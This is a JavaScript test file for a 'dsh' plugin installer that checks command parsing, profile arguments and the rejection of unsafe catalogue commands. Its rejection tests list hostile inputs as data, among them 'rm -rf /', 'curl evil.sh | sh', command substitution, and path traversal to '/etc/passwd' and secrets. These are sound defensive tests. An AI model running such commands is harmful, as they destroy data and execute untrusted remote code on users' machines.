import assert from "node:assert/strict";
import { test } from "node:test";

import {
  planFromCommand,
  planFromPlugin,
  installArgs,
  InstallError,
} from "../src/installer.js";

test("accepts a bare npm specifier", () => {
  const plan = planFromCommand("dsh plugin add dsh-memory", "a/b");
  assert.equal(plan.target, "dsh-memory");
});

// `dsh plugin` forwards to pnpm inside a profile directory, so the profile is
// mandatory. Getting this wrong makes every install fail with
// "required option '--profile <name>' not specified".
test("install args name the profile", () => {
  const plan = planFromCommand("dsh plugin add dsh-memory", "a/b");
  assert.deepEqual(installArgs(plan, "web"), [
    "plugin",
    "--profile",
    "web",
    "add",
    "dsh-memory",
  ]);
});

test("accepts a scoped npm specifier", () => {
  const plan = planFromCommand("dsh plugin add @scope/dsh-thing", "a/b");
  assert.equal(plan.target, "@scope/dsh-thing");
});

test("accepts a github target with a subpath", () => {
  const plan = planFromCommand(
    "dsh plugin add github:volcengine/OpenViking#examples/dsh-memory-plugin",
    "a/b",
  );
  assert.equal(plan.target, "github:volcengine/OpenViking#examples/dsh-memory-plugin");
});

// The catalogue is remote. If it is ever compromised or simply wrong, the
// blast radius must stop at this function rather than reach a shell.
for (const hostile of [
  "dsh plugin add foo; rm -rf /",
  "dsh plugin add foo && curl evil.sh | sh",
  "dsh plugin add $(whoami)",
  "dsh plugin add `id`",
  "dsh plugin add foo\nrm -rf /",
  "rm -rf /",
  "dsh plugin remove foo",
  "dsh plugin add ../../etc/passwd",
  "dsh plugin add https://evil.example/x.tgz",
]) {
  test(`rejects: ${JSON.stringify(hostile)}`, () => {
    assert.throws(
      () => planFromCommand(hostile, "a/b"),
      (err) => err instanceof InstallError && err.code === "UNSAFE_COMMAND",
    );
  });
}

test("rejects a listing with no install command", () => {
  assert.throws(
    () => planFromPlugin({ fullName: "a/b" }),
    (err) => err.code === "NO_COMMAND",
  );
});

test("falls back to the first install option", () => {
  const plan = planFromPlugin({
    fullName: "a/b",
    installOptions: [{ cmd: "dsh plugin add dsh-thing" }],
  });
  assert.equal(plan.target, "dsh-thing");
});

// Regression: `../../etc/passwd` is only word characters, dots and slashes, so
// a permissive npm pattern accepted it as a package name.
for (const traversal of [
  "dsh plugin add ../../etc/passwd",
  "dsh plugin add ./local-thing",
  "dsh plugin add github:owner/repo#../../secrets",
  "dsh plugin add @scope/../escape",
]) {
  test(`rejects traversal: ${JSON.stringify(traversal)}`, () => {
    assert.throws(
      () => planFromCommand(traversal, "a/b"),
      (err) => err.code === "UNSAFE_COMMAND",
    );
  });
}

test("profile is derived from the plugin's own install path", async () => {
  const { currentProfile } = await import("../src/profile.js");
  assert.equal(
    currentProfile("file:///Users/x/.dsh/profiles/web/node_modules/p/lib/index.js"),
    "web",
  );
  assert.equal(
    currentProfile("file:///Users/x/.dsh/profiles/tui/node_modules/p/lib/index.js"),
    "tui",
  );
  assert.equal(currentProfile("file:///somewhere/else/index.js"), "web");
});
